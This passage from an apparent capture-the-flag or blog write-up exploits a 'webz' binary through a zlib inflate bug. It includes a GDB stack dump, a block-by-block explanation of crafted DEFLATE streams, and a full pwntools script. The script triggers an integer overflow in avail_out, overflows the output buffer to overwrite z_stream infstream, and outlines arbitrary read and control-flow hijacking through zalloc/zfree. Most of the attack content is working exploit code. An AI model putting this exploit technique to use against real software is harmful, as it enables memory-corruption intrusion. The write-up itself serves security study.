0x000064f4b02533b0│+0x0040: 0x000064f4af885820  →  &lt;webz_alloc+0000&gt; push rbp
0x000064f4b02533b8│+0x0048: 0x000064f4af8a3390  →  &lt;zcfree+0000&gt; push rbp
0x000064f4b02533c0│+0x0050: 0x0000000000000000
0x000064f4b02533c8│+0x0058: 0x0000000000000040 (&#34;@&#34;?)
&#34;&#34;&#34;</span>

payload <span>=</span> stream<span>.</span>get_bytes<span>(</span><span>)</span>
<span>print</span><span>(</span><span><span>f&#34;Generated DEFLATE payload (</span><span><span>{</span><span>len</span><span>(</span>payload<span>)</span><span>}</span></span><span> bytes):&#34;</span></span><span>)</span>

p <span>=</span> process<span>(</span><span>&#34;./webz&#34;</span><span>)</span>
<span>#p = process(&#34;./src/webz_asan&#34;)</span>

<span>def</span> <span>send_webz_payload</span><span>(</span>pay<span>)</span><span>:</span>
    <span>#MAX_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(52) # MAX = 52, 52</span>
    NORMAL_AROUND_WIDTH_HEIGHT <span>=</span> p8<span>(</span><span>0x0</span><span>)</span> <span>+</span> p8<span>(</span><span>52</span><span>)</span> <span>+</span> p8<span>(</span><span>0x0</span><span>)</span> <span>+</span> p8<span>(</span><span>5</span><span>)</span>
    p<span>.</span>send<span>(</span>p32<span>(</span><span>len</span><span>(</span>pay<span>)</span><span>+</span><span>12</span><span>)</span><span>)</span>
    p<span>.</span>send<span>(</span><span>b&#34;WEBZ&#34;</span><span>+</span>NORMAL_AROUND_WIDTH_HEIGHT<span>+</span><span>b&#34;\x00\x00\x00\x00&#34;</span><span>+</span>pay<span>)</span>

<span>raw_input</span><span>(</span><span>)</span>
send_webz_payload<span>(</span>payload<span>)</span>

p<span>.</span>interactive<span>(</span><span>)</span></code></pre>
<p>The PoC uses six blocks. Let’s walk through them.</p>
<pre><code><span># STORED BLOCK ===============================================================================</span>
stream<span>.</span><span>write_bits</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span> # BFINAL
stream<span>.</span><span>write_bits</span><span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> # BTYPE <span>(</span><span>0</span> <span>for</span> stored<span>)</span>
stream<span>.</span><span>bytebits</span><span>(</span><span>)</span>
stored_block_length <span>=</span> <span>0x200</span>
stream<span>.</span><span>write_bits</span><span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
<span>for</span> i in <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
    stream<span>.</span><span>write_bits</span><span>(</span><span>ord</span><span>(</span><span>&#39;X&#39;</span><span>)</span><span>,</span> <span>8</span><span>)</span>
<span># STORED BLOCK ===============================================================================</span></code></pre>
<p>Block 1: writes dummy bytes to the output buffer so that later copies with large distances won’t misbehave.</p>
<pre><code><span># DYNAMIC BLOCK ==============================================================================</span>
symbol_stream <span>=</span> <span>[</span> <span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span> <span>]</span>

ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>3</span> # EOB

dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
<span>for</span> i in <span>range</span><span>(</span><span>17</span><span>,</span><span>30</span><span>)</span><span>:</span>
    dist_lengths<span>[</span>i<span>]</span> <span>=</span> <span>15</span>

<span>create_dynamic_deflate_payload</span><span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
<span># DYNAMIC BLOCK ==============================================================================</span></code></pre>
<p>Block 2: prepares the ground for the bug by filling the table area with Distance symbols. Those entries will persist in uninitialized slots later.</p>
<pre><code><span># DYNAMIC BLOCK ==============================================================================</span>
symbol_stream <span>=</span> <span>[</span><span>]</span>

symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>8</span><span>,</span><span>10</span><span>)</span><span>)</span><span>)</span>
symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>0</span>b1111111<span>,</span><span>7</span><span>)</span><span>)</span><span>)</span> # extra bits
symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>int</span><span>(</span><span>&#39;000&#39;</span><span>[</span><span>::</span><span>-</span><span>1</span><span>]</span><span>,</span><span>2</span><span>)</span><span>,</span><span>3</span><span>)</span><span>)</span><span>)</span>
symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>0</span>b1111111<span>,</span><span>7</span><span>)</span><span>)</span><span>)</span> # extra bits
symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span><span>)</span>
ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>10</span> # EOB
ll_lengths<span>[</span><span>257</span><span>]</span> <span>=</span> <span>10</span> # Length <span>3</span>
ll_lengths<span>[</span><span>258</span><span>]</span> <span>=</span> <span>12</span> # Length <span>4</span>

dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
dist_lengths<span>[</span><span>17</span><span>]</span> <span>=</span> <span>3</span> # Distance <span>?</span><span>?</span><span>?</span>

<span>create_dynamic_deflate_payload</span><span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
<span># DYNAMIC BLOCK ==============================================================================</span></code></pre>
<p>Block 3: creates an incomplete Huffman table and references the uninitialized entry to perform LZ77 decoding. This actually triggers the bug and causes integer overflow in <code>avail_out</code>. From this point on, boundary checks for the decompression buffer malfunction, enabling buffer overflow.</p>
<pre><code><span># STORED BLOCK ===============================================================================</span>
stream<span>.</span><span>write_bits</span><span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span> # dummy
stream<span>.</span><span>write_bits</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span> # BFINAL
stream<span>.</span><span>write_bits</span><span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> # BTYPE <span>(</span><span>0</span> <span>for</span> stored<span>)</span>
stream<span>.</span><span>bytebits</span><span>(</span><span>)</span>
stored_block_length <span>=</span> <span>0x10</span>
stream<span>.</span><span>write_bits</span><span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
<span>for</span> i in <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
    stream<span>.</span><span>write_bits</span><span>(</span><span>ord</span><span>(</span><span>&#39;C&#39;</span><span>)</span><span>,</span> <span>8</span><span>)</span>
<span># STORED BLOCK ===============================================================================</span>

<span># DYNAMIC BLOCK ==============================================================================</span>
symbol_stream <span>=</span> <span>[</span><span>]</span>
symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>)</span>
<span>for</span> i in <span>range</span><span>(</span><span>0</span><span>,</span><span>0x2ce</span><span>)</span><span>:</span>
    symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#39;LD&#39;</span><span>,</span> <span>(</span><span>10</span><span>,</span> <span>1</span><span>)</span><span>)</span><span>)</span>
<span>for</span> i in <span>range</span><span>(</span><span>0</span><span>,</span><span>7</span><span>)</span><span>:</span>
    symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>)</span>
symbol_stream<span>.</span><span>append</span><span>(</span><span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span><span>)</span>

ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
ll_lengths<span>[</span><span>65</span><span>]</span> <span>=</span> <span>3</span>  # <span>&#39;A&#39;</span>
ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>3</span> # EOB
ll_lengths<span>[</span><span>264</span><span>]</span> <span>=</span> <span>3</span> # Length <span>10</span>

dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
dist_lengths<span>[</span><span>0</span><span>]</span> <span>=</span> <span>3</span> # Distance <span>1</span>


<span>create_dynamic_deflate_payload</span><span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
<span># DYNAMIC BLOCK ==============================================================================</span></code></pre>
<p>As noted, to overwrite <code>z_stream infstream</code>, we must first fill the 8192‑byte output buffer. We use LZ77 and a stored block to push ~8120 bytes of padding.</p>
<blockquote>
<p>Due to padding/alignment within <code>WebzState</code>, we need 8120 bytes (not 8192) to reach just before <code>z_stream infstream</code>. Also, because the decompression buffer is larger than the compressed input limit, we use LZ77 to generate many output bytes from little input.</p>
</blockquote>
<pre><code><span># STORED BLOCK ===============================================================================</span>
overwrriten_infstream <span>=</span> b<span>&#39;X&#39;</span><span>*</span><span>0x60</span>

stream<span>.</span><span>write_bits</span><span>(</span><span>1</span><span>,</span> <span>1</span><span>)</span> # BFINAL
stream<span>.</span><span>write_bits</span><span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> # BTYPE <span>(</span><span>0</span> <span>for</span> stored<span>)</span>
stream<span>.</span><span>bytebits</span><span>(</span><span>)</span>
stored_block_length <span>=</span> <span>len</span><span>(</span>overwrriten_infstream<span>)</span>
stream<span>.</span><span>write_bits</span><span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
<span>for</span> i in <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
    stream<span>.</span><span>write_bits</span><span>(</span>overwrriten_infstream<span>[</span>i<span>]</span><span>,</span> <span>8</span><span>)</span>
<span># STORED BLOCK =============================================================================</span></code></pre>
<p>The final block performs the actual overflow to overwrite <code>z_stream infstream</code>, letting us set its members arbitrarily.</p>
<p><img src="https://velog.velcdn.com/images/0range1337/post/c9ac4c64-d319-4e8a-bf85-a9cc40aebf78/image.png"/></p>
<p>Running the PoC confirms <code>z_stream infstream</code> is overwritten.</p>

<p>The exploit is straightforward.</p>
<pre><code><span>printf</span><span>(</span><span>&#34;Read receipt: %s\n&#34;</span><span>,</span> webz_state<span>.</span>infstream<span>.</span>msg<span>)</span><span>;</span></code></pre>
<p>First, by partially overwriting the <code>msg</code> pointer in <code>infstream</code> or setting it arbitrarily, we get arbitrary read.</p>
<pre><code>local <span>int</span> <span>updatewindow</span><span>(</span>z_streamp strm<span>,</span> <span>const</span> Bytef <span>*</span>end<span>,</span> <span>unsigned</span> copy<span>)</span> <span>{</span>
    <span>struct</span> <span>inflate_state</span> FAR <span>*</span>state<span>;</span>
    <span>unsigned</span> dist<span>;</span>

    state <span>=</span> <span>(</span><span>struct</span> <span>inflate_state</span> FAR <span>*</span><span>)</span>strm<span>-&gt;</span>state<span>;</span>

    <span>/* if it hasn&#39;t been done already, allocate space for the window */</span>
    <span>if</span> <span>(</span>state<span>-&gt;</span>window <span>==</span> Z_NULL<span>)</span> <span>{</span>
        state<span>-&gt;</span>window <span>=</span> <span>(</span><span>unsigned</span> <span>char</span> FAR <span>*</span><span>)</span>
                        <span>ZALLOC</span><span>(</span>strm<span>,</span> <span>1U</span> <span>&lt;&lt;</span> state<span>-&gt;</span>wbits<span>,</span>
                               <span>sizeof</span><span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span>state<span>-&gt;</span>window <span>==</span> Z_NULL<span>)</span> <span>return</span> <span>1</span><span>;</span>
    <span>}</span>
<span>.</span><span>.</span><span>.</span></code></pre>
<pre><code><span>int</span> ZEXPORT <span>inflateEnd</span><span>(</span>z_streamp strm<span>)</span> <span>{</span>
    <span>struct</span> <span>inflate_state</span> FAR <span>*</span>state<span>;</span>
    <span>if</span> <span>(</span><span>inflateStateCheck</span><span>(</span>strm<span>)</span><span>)</span>
        <span>return</span> Z_STREAM_ERROR<span>;</span>
    state <span>=</span> <span>(</span><span>struct</span> <span>inflate_state</span> FAR <span>*</span><span>)</span>strm<span>-&gt;</span>state<span>;</span>
    <span>if</span> <span>(</span>state<span>-&gt;</span>window <span>!=</span> Z_NULL<span>)</span> <span>ZFREE</span><span>(</span>strm<span>,</span> state<span>-&gt;</span>window<span>)</span><span>;</span>
    <span>ZFREE</span><span>(</span>strm<span>,</span> strm<span>-&gt;</span>state<span>)</span><span>;</span>
    strm<span>-&gt;</span>state <span>=</span> Z_NULL<span>;</span>
    <span>Tracev</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate: end\n&#34;</span><span>)</span><span>)</span><span>;</span>
    <span>return</span> Z_OK<span>;</span>
<span>}</span></code></pre>
<p>Additionally, since <code>updatewindow</code> and <code>inflateEnd</code> call <code>zalloc</code>/<code>zfree</code>, control‑flow hijacking is easy.</p>
<pre><code><span>import</span> struct
<span>from</span> pwn <span>import</span> <span>*</span>

<span>class</span> <span>BitStream</span><span>:</span>
    <span>&#34;&#34;&#34;LSB-first bit stream writer.&#34;&#34;&#34;</span>
    <span>def</span> <span>__init__</span><span>(</span>self<span>)</span><span>:</span>
        self<span>.</span>bits <span>=</span> <span>0</span>
        self<span>.</span>bit_count <span>=</span> <span>0</span>
        self<span>.</span>data <span>=</span> <span>bytearray</span><span>(</span><span>)</span>

    <span>def</span> <span>write_bits</span><span>(</span>self<span>,</span> value<span>,</span> num_bits<span>)</span><span>:</span>
        <span>for</span> i <span>in</span> <span>range</span><span>(</span>num_bits<span>)</span><span>:</span>
            bit <span>=</span> <span>(</span>value <span>&gt;&gt;</span> i<span>)</span> <span>&amp;</span> <span>1</span>
            <span>if</span> bit<span>:</span>
                self<span>.</span>bits <span>|</span><span>=</span> <span>(</span><span>1</span> <span>&lt;&lt;</span> self<span>.</span>bit_count<span>)</span>
            self<span>.</span>bit_count <span>+=</span> <span>1</span>
            <span>if</span> self<span>.</span>bit_count <span>==</span> <span>8</span><span>:</span>
                self<span>.</span>data<span>.</span>append<span>(</span>self<span>.</span>bits<span>)</span>
                self<span>.</span>bits <span>=</span> <span>0</span>
                self<span>.</span>bit_count <span>=</span> <span>0</span>
    
    <span>def</span> <span>bytebits</span><span>(</span>self<span>)</span><span>:</span>
        self<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>8</span> <span>-</span> <span>(</span>self<span>.</span>bit_count <span>%</span> <span>8</span><span>)</span><span>)</span>

    <span>def</span> <span>get_bytes</span><span>(</span>self<span>)</span><span>:</span>
        <span>if</span> self<span>.</span>bit_count <span>&gt;</span> <span>0</span><span>:</span>
            self<span>.</span>data<span>.</span>append<span>(</span>self<span>.</span>bits<span>)</span>
        <span>return</span> self<span>.</span>data

<span>def</span> <span>generate_huffman_codes_from_lengths</span><span>(</span>lengths<span>)</span><span>:</span>
    max_len <span>=</span> <span>0</span>
    <span>for</span> length <span>in</span> lengths<span>:</span>
        <span>if</span> length <span>&gt;</span> max_len<span>:</span>
            max_len <span>=</span> length
    
    <span>if</span> max_len <span>==</span> <span>0</span><span>:</span>
        <span>return</span> <span>{</span><span>}</span>

    bl_count <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>(</span>max_len <span>+</span> <span>1</span><span>)</span>
    <span>for</span> length <span>in</span> lengths<span>:</span>
        <span>if</span> length <span>&gt;</span> <span>0</span><span>:</span>
            bl_count<span>[</span>length<span>]</span> <span>+=</span> <span>1</span>
    
    code <span>=</span> <span>0</span>
    next_code <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>(</span>max_len <span>+</span> <span>1</span><span>)</span>
    <span>for</span> bits_len <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> max_len <span>+</span> <span>1</span><span>)</span><span>:</span>
        code <span>=</span> <span>(</span>code <span>+</span> bl_count<span>[</span>bits_len <span>-</span> <span>1</span><span>]</span><span>)</span> <span>&lt;&lt;</span> <span>1</span>
        next_code<span>[</span>bits_len<span>]</span> <span>=</span> code

    huffman_codes <span>=</span> <span>{</span><span>}</span>
    <span>for</span> i<span>,</span> length <span>in</span> <span>enumerate</span><span>(</span>lengths<span>)</span><span>:</span>
        <span>if</span> length <span>!=</span> <span>0</span><span>:</span>
            rev_code <span>=</span> <span>int</span><span>(</span><span><span>f&#39;</span><span><span>{</span>next_code<span>[</span>length<span>]</span><span>:</span><span>0</span><span>{</span>length<span>}</span>b<span>}</span></span><span>&#39;</span></span><span>[</span><span>:</span><span>:</span><span>-</span><span>1</span><span>]</span><span>,</span> <span>2</span><span>)</span>
            huffman_codes<span>[</span>i<span>]</span> <span>=</span> <span>(</span>rev_code<span>,</span> length<span>)</span>
            next_code<span>[</span>length<span>]</span> <span>+=</span> <span>1</span>
    
    <span>return</span> huffman_codes

lbase <span>=</span> <span>[</span><span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>,</span> <span>9</span><span>,</span> <span>10</span><span>,</span> <span>11</span><span>,</span> <span>13</span><span>,</span> <span>15</span><span>,</span> <span>17</span><span>,</span> <span>19</span><span>,</span> <span>23</span><span>,</span> <span>27</span><span>,</span> <span>31</span><span>,</span> <span>35</span><span>,</span> <span>43</span><span>,</span> <span>51</span><span>,</span> <span>59</span><span>,</span> <span>67</span><span>,</span> <span>83</span><span>,</span> <span>99</span><span>,</span> <span>115</span><span>,</span> <span>131</span><span>,</span> <span>163</span><span>,</span> <span>195</span><span>,</span> <span>227</span><span>,</span> <span>258</span><span>]</span>
lext <span>=</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>3</span><span>,</span> <span>3</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>5</span><span>,</span> <span>5</span><span>,</span> <span>5</span><span>,</span> <span>0</span><span>]</span>
dbase <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>7</span><span>,</span> <span>9</span><span>,</span> <span>13</span><span>,</span> <span>17</span><span>,</span> <span>25</span><span>,</span> <span>33</span><span>,</span> <span>49</span><span>,</span> <span>65</span><span>,</span> <span>97</span><span>,</span> <span>129</span><span>,</span> <span>193</span><span>,</span> <span>257</span><span>,</span> <span>385</span><span>,</span> <span>513</span><span>,</span> <span>769</span><span>,</span> <span>1025</span><span>,</span> <span>1537</span><span>,</span> <span>2049</span><span>,</span> <span>3073</span><span>,</span> <span>4097</span><span>,</span> <span>6145</span><span>,</span> <span>8193</span><span>,</span> <span>12289</span><span>,</span> <span>16385</span><span>,</span> <span>24577</span><span>]</span>
dext <span>=</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>,</span> <span>8</span><span>,</span> <span>9</span><span>,</span> <span>9</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>,</span> <span>11</span><span>,</span> <span>11</span><span>,</span> <span>12</span><span>,</span> <span>12</span><span>,</span> <span>13</span><span>,</span> <span>13</span><span>]</span>
order <span>=</span> <span>[</span><span>16</span><span>,</span> <span>17</span><span>,</span> <span>18</span><span>,</span> <span>0</span><span>,</span> <span>8</span><span>,</span> <span>7</span><span>,</span> <span>9</span><span>,</span> <span>6</span><span>,</span> <span>10</span><span>,</span> <span>5</span><span>,</span> <span>11</span><span>,</span> <span>4</span><span>,</span> <span>12</span><span>,</span> <span>3</span><span>,</span> <span>13</span><span>,</span> <span>2</span><span>,</span> <span>14</span><span>,</span> <span>1</span><span>,</span> <span>15</span><span>]</span>

<span>def</span> <span>find_len_sym</span><span>(</span>length<span>)</span><span>:</span>
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>len</span><span>(</span>lbase<span>)</span><span>)</span><span>:</span>
        <span>if</span> lbase<span>[</span>i<span>]</span> <span>&gt;</span> length<span>:</span>
            i <span>-=</span> <span>1</span>
            <span>break</span>
    base_len <span>=</span> lbase<span>[</span>i<span>]</span>
    extra_bits <span>=</span> lext<span>[</span>i<span>]</span>
    extra_val <span>=</span> length <span>-</span> base_len
    <span>return</span> <span>257</span> <span>+</span> i<span>,</span> extra_bits<span>,</span> extra_val

<span>def</span> <span>find_dist_sym</span><span>(</span>distance<span>)</span><span>:</span>
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>len</span><span>(</span>dbase<span>)</span><span>)</span><span>:</span>
        <span>if</span> dbase<span>[</span>i<span>]</span> <span>&gt;</span> distance<span>:</span>
            i <span>-=</span> <span>1</span>
            <span>break</span>
    base_dist <span>=</span> dbase<span>[</span>i<span>]</span>
    extra_bits <span>=</span> dext<span>[</span>i<span>]</span>
    extra_val <span>=</span> distance <span>-</span> base_dist
    <span>return</span> i<span>,</span> extra_bits<span>,</span> extra_val

<span>def</span> <span>encode_lengths_rle</span><span>(</span>lengths<span>)</span><span>:</span>
    encoded <span>=</span> <span>[</span><span>]</span>
    i <span>=</span> <span>0</span>
    <span>while</span> i <span>&lt;</span> <span>len</span><span>(</span>lengths<span>)</span><span>:</span>
        current_len <span>=</span> lengths<span>[</span>i<span>]</span>
        
        <span>if</span> current_len <span>==</span> <span>0</span><span>:</span>
            count <span>=</span> <span>0</span>
            <span>while</span> i <span>+</span> count <span>&lt;</span> <span>len</span><span>(</span>lengths<span>)</span> <span>and</span> lengths<span>[</span>i <span>+</span> count<span>]</span> <span>==</span> <span>0</span> <span>and</span> count <span>&lt;</span> <span>138</span><span>:</span>
                count <span>+=</span> <span>1</span>
            <span>if</span> count <span>&gt;=</span> <span>11</span><span>:</span>
                encoded<span>.</span>append<span>(</span><span>(</span><span>18</span><span>,</span> count <span>-</span> <span>11</span><span>)</span><span>)</span>
                i <span>+=</span> count
                <span>continue</span>
            <span>if</span> count <span>&gt;=</span> <span>3</span><span>:</span>
                encoded<span>.</span>append<span>(</span><span>(</span><span>17</span><span>,</span> count <span>-</span> <span>3</span><span>)</span><span>)</span>
                i <span>+=</span> count
                <span>continue</span>

        <span>if</span> i <span>&gt;</span> <span>0</span> <span>and</span> current_len <span>==</span> lengths<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>:</span>
            count <span>=</span> <span>0</span>
            <span>while</span> i <span>+</span> count <span>&lt;</span> <span>len</span><span>(</span>lengths<span>)</span> <span>and</span> lengths<span>[</span>i <span>+</span> count<span>]</span> <span>==</span> current_len <span>and</span> count <span>&lt;</span> <span>6</span><span>:</span>
                count <span>+=</span> <span>1</span>
            <span>if</span> count <span>&gt;=</span> <span>3</span><span>:</span>
                encoded<span>.</span>append<span>(</span><span>(</span><span>16</span><span>,</span> count <span>-</span> <span>3</span><span>)</span><span>)</span>
                i <span>+=</span> count
                <span>continue</span>

        encoded<span>.</span>append<span>(</span><span>(</span>current_len<span>,</span> <span>None</span><span>)</span><span>)</span>
        i <span>+=</span> <span>1</span>
    <span>return</span> encoded

<span>def</span> <span>create_dynamic_deflate_payload</span><span>(</span>stream<span>,</span> is_last<span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span><span>:</span>
    
    nlen <span>=</span> <span>max</span><span>(</span>i <span>for</span> i<span>,</span> length <span>in</span> <span>enumerate</span><span>(</span>ll_lengths<span>)</span> <span>if</span> length <span>&gt;</span> <span>0</span><span>)</span> <span>+</span> <span>1</span>
    ndist <span>=</span> <span>max</span><span>(</span>i <span>for</span> i<span>,</span> length <span>in</span> <span>enumerate</span><span>(</span>dist_lengths<span>)</span> <span>if</span> length <span>&gt;</span> <span>0</span><span>)</span> <span>+</span> <span>1</span>
    
    all_lengths <span>=</span> ll_lengths<span>[</span><span>:</span>nlen<span>]</span> <span>+</span> dist_lengths<span>[</span><span>:</span>ndist<span>]</span>
    rle_encoded_lengths <span>=</span> encode_lengths_rle<span>(</span>all_lengths<span>)</span>
    
    rle_symbols <span>=</span> <span>[</span>item<span>[</span><span>0</span><span>]</span> <span>for</span> item <span>in</span> rle_encoded_lengths<span>]</span>
    code_symbol_freqs <span>=</span> <span>{</span>sym<span>:</span> rle_symbols<span>.</span>count<span>(</span>sym<span>)</span> <span>for</span> sym <span>in</span> <span>set</span><span>(</span>rle_symbols<span>)</span><span>}</span>
    
    code_table_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>19</span>
    <span>for</span> sym <span>in</span> code_symbol_freqs<span>:</span>
        code_table_lengths<span>[</span>sym<span>]</span> <span>=</span> <span>7</span>
    
    ncode <span>=</span> <span>max</span><span>(</span>i <span>for</span> i<span>,</span> length <span>in</span> <span>enumerate</span><span>(</span>order<span>)</span> <span>if</span> code_table_lengths<span>[</span>length<span>]</span> <span>&gt;</span> <span>0</span><span>)</span> <span>+</span> <span>1</span>

    code_huffman_table <span>=</span> generate_huffman_codes_from_lengths<span>(</span>code_table_lengths<span>)</span>

    stream<span>.</span>write_bits<span>(</span>is_last<span>,</span> <span>1</span><span>)</span> <span># BFINAL</span>
    stream<span>.</span>write_bits<span>(</span><span>2</span><span>,</span> <span>2</span><span>)</span> <span># BTYPE (10 for dynamic)</span>

    stream<span>.</span>write_bits<span>(</span>nlen <span>-</span> <span>257</span><span>,</span> <span>5</span><span>)</span>
    stream<span>.</span>write_bits<span>(</span>ndist <span>-</span> <span>1</span><span>,</span> <span>5</span><span>)</span>
    stream<span>.</span>write_bits<span>(</span>ncode <span>-</span> <span>4</span><span>,</span> <span>4</span><span>)</span>

    <span>for</span> i <span>in</span> <span>range</span><span>(</span>ncode<span>)</span><span>:</span>
        stream<span>.</span>write_bits<span>(</span>code_table_lengths<span>[</span>order<span>[</span>i<span>]</span><span>]</span><span>,</span> <span>3</span><span>)</span>
        
    <span>for</span> sym<span>,</span> extra_val <span>in</span> rle_encoded_lengths<span>:</span>
        code<span>,</span> length <span>=</span> code_huffman_table<span>[</span>sym<span>]</span>
        stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
        <span>if</span> sym <span>==</span> <span>16</span><span>:</span> stream<span>.</span>write_bits<span>(</span>extra_val<span>,</span> <span>2</span><span>)</span>
        <span>elif</span> sym <span>==</span> <span>17</span><span>:</span> stream<span>.</span>write_bits<span>(</span>extra_val<span>,</span> <span>3</span><span>)</span>
        <span>elif</span> sym <span>==</span> <span>18</span><span>:</span> stream<span>.</span>write_bits<span>(</span>extra_val<span>,</span> <span>7</span><span>)</span>


    ll_huffman_table <span>=</span> generate_huffman_codes_from_lengths<span>(</span>ll_lengths<span>)</span>
    dist_huffman_table <span>=</span> generate_huffman_codes_from_lengths<span>(</span>dist_lengths<span>)</span>
    
    <span>for</span> <span>type</span><span>,</span> val <span>in</span> symbol_stream<span>:</span>
        <span>if</span> <span>type</span> <span>==</span> <span>&#39;LIT&#39;</span><span>:</span>
            code<span>,</span> length <span>=</span> ll_huffman_table<span>[</span>val<span>]</span>
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
        <span>elif</span> <span>type</span> <span>==</span> <span>&#39;EOB&#39;</span><span>:</span>
            code<span>,</span> length <span>=</span> ll_huffman_table<span>[</span>val<span>]</span>
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
        <span>elif</span> <span>type</span> <span>==</span> <span>&#39;LD&#39;</span><span>:</span>
            l<span>,</span> d <span>=</span> val
            len_sym<span>,</span> len_extra_bits<span>,</span> len_extra_val <span>=</span> find_len_sym<span>(</span>l<span>)</span>
            dist_sym<span>,</span> dist_extra_bits<span>,</span> dist_extra_val <span>=</span> find_dist_sym<span>(</span>d<span>)</span>
            
            code<span>,</span> length <span>=</span> ll_huffman_table<span>[</span>len_sym<span>]</span>
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
            <span>if</span> len_extra_bits <span>&gt;</span> <span>0</span><span>:</span>
                stream<span>.</span>write_bits<span>(</span>len_extra_val<span>,</span> len_extra_bits<span>)</span>
            
            code<span>,</span> length <span>=</span> dist_huffman_table<span>[</span>dist_sym<span>]</span>
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
